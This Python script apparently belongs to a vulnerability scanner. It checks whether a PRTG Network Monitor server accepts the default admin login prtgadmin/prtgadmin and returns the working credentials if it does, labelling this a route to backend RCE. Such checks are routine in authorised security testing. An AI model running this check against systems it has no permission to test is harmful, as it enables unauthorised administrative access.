import requests
import urllib

def verify(url):
    relsult = {
        'name': 'PRTG NetWork Monitot default password (后台rce)',
        'vulnerable': False,
        'url': url,
        'about': 'https://www.secpulse.com/archives/113566.html',
    }
    username = 'prtgadmin'
    password = 'prtgadmin'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/public/checklogin.htm')
    data = f'loginurl=&username={username}&password={password}'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, allow_redirects=False, verify=False)
        if rep.status_code == 302 and 'OCTOPUS' in rep.headers['Set-Cookie'] and 'PRTG' in rep.headers['Server']:
            relsult['vulnerable'] = True
            relsult['username'] = username
            relsult['password'] = password
        return relsult
    except:
        return relsult